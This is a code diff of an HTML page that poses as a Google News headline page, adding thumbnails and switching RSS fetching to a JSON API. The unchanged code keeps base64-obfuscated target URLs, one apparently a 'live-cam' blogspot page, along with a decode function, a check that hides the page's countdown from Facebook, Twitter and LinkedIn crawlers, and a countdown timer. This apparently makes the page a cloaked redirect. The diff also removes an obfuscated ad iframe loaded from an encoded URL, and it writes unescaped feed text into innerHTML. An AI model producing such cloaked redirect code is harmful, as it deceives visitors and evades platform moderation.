@@ -41,15 +41,30 @@
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
     }
     .news-item {
+      display: flex;
+      align-items: flex-start;
       background: #f8f9fa;
       margin: 10px 0;
       padding: 12px;
       border-radius: 8px;
       border-left: 4px solid #4285f4;
+      gap: 12px;
+    }
+    .news-thumb {
+      flex-shrink: 0;
+      width: 100px;
+      height: 70px;
+      border-radius: 6px;
+      object-fit: cover;
+    }
+    .news-content {
+      flex: 1;
     }
     .news-title a {
       text-decoration: none;
       color: #333;
+      font-weight: 600;
+      line-height: 1.4;
     }
     .news-title a:hover {
       color: #1a73e8;
@@ -57,6 +72,7 @@
     .news-meta {
       font-size: 0.8rem;
       color: #666;
+      margin-top: 4px;
       display: flex;
       justify-content: space-between;
     }
@@ -75,7 +91,7 @@
   </div>
 
   <div class="subdomain-info" id="subdomain-info">
-    Access from: <span id="current-subdomain">Loading...</span>
+    Access from: <span id="current-subdomain">main</span>
   </div>
 
   <div class="news-container">
@@ -91,13 +107,6 @@
       'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
     ];
 
-    function getCurrentSubdomain() {
-      const hostname = window.location.hostname;
-      const parts = hostname.split('.');
-      if (parts.length >= 3 && parts[1].includes('xbling')) return parts[0];
-      return 'main';
-    }
-
     function decryptTarget(encrypted) {
       return atob(encrypted);
     }
@@ -111,31 +120,37 @@
       return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
     }
 
-       async function loadSimpleNews() {
+    // 📰 LẤY TIN + ẢNH TỪ RSS GOOGLE NEWS
+    async function loadSimpleNews() {
       const container = document.getElementById('news-container');
       const rssURL = 'https://news.google.com/rss?hl=en-US&gl=US';
-      const proxyURL = `https://api.allorigins.win/get?url=${encodeURIComponent(rssURL)}`;
-      
+      const apiURL = `https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(rssURL)}`;
+
       try {
-        const res = await fetch(proxyURL);
+        const res = await fetch(apiURL);
         const data = await res.json();
-        const parser = new DOMParser();
-        const xml = parser.parseFromString(data.contents, "application/xml");
-        const items = xml.querySelectorAll("item");
-        if (!items.length) throw new Error("No items found in RSS");
+
+        if (!data.items || !data.items.length) {
+          container.innerHTML = '<div class="loading">No news found.</div>';
+          return;
+        }
 
         let newsHTML = '';
-        items.forEach((item, index) => {
-          if (index >= 8) return; // Giới hạn 8 tin
-          const title = item.querySelector("title")?.textContent || "Untitled";
-          const link = item.querySelector("link")?.textContent || "#";
-          const pubDate = new Date(item.querySelector("pubDate")?.textContent || "").toLocaleDateString();
+        data.items.slice(0, 8).forEach(item => {
+          const title = item.title;
+          const link = item.link;
+          const pubDate = new Date(item.pubDate).toLocaleDateString();
+          const thumb = item.thumbnail || item.enclosure?.link || 'https://via.placeholder.com/100x70?text=News';
+
           newsHTML += `
             <div class="news-item">
-              <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
-              <div class="news-meta">
-                <span>Google News</span>
-                <span>${pubDate}</span>
+              <img class="news-thumb" src="${thumb}" alt="">
+              <div class="news-content">
+                <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
+                <div class="news-meta">
+                  <span>${data.feed.title}</span>
+                  <span>${pubDate}</span>
+                </div>
               </div>
             </div>
           `;
@@ -144,14 +159,11 @@
         container.innerHTML = newsHTML;
       } catch (err) {
         console.error("RSS load error:", err);
-        container.innerHTML = '<div class="loading">⚠️ Unable to load news. Please try again later.</div>';
+        container.innerHTML = '<div class="loading">⚠️ Unable to load news.</div>';
       }
     }
 
     function startCountdown() {
-      const sub = getCurrentSubdomain();
-      document.getElementById('current-subdomain').textContent = sub;
-
       if (isFacebookBot()) {
         document.getElementById('countdown-section').style.display = 'none';
         document.getElementById('subdomain-info').style.display = 'none';
@@ -170,41 +182,9 @@
       }, 1000);
     }
 
-    function loadAdIframe() {
-      const ENCRYPTED_AD = 'aHR0cHM6Ly9vYmxpdmlvbnBsYXlzYWx0ZXJlZC5jb20vbmNjNTNuaWpmaz9rZXk9MDJkNmVmY2VhZjhiN2E3ZjU2NGI5OTQxM2M0YjMwNTY=';
-
-      const adURL = atob(ENCRYPTED_AD);
-
-      const iframeContainer = document.createElement('div');
-      iframeContainer.style.marginTop = '30px';
-      iframeContainer.style.textAlign = 'center';
-
-      const iframe = document.createElement('iframe');
-      iframe.src = adURL;
-      iframe.width = '100%';
-      iframe.height = '450';
-      iframe.style.border = 'none';
-      iframe.style.borderRadius = '10px';
-      iframe.loading = 'lazy';
-      iframe.referrerPolicy = 'no-referrer';
-      iframe.title = 'Advertisement';
-
-      const label = document.createElement('div');
-      label.textContent = 'Sponsored content (transparent)';
-      label.style.fontSize = '0.9rem';
-      label.style.color = '#666';
-      label.style.marginBottom = '6px';
-
-      iframeContainer.appendChild(label);
-      iframeContainer.appendChild(iframe);
-
-      document.body.appendChild(iframeContainer);
-    }
-
     document.addEventListener('DOMContentLoaded', () => {
       loadSimpleNews();
       startCountdown();
-      loadAdIframe();
     });
   </script>
 </body>
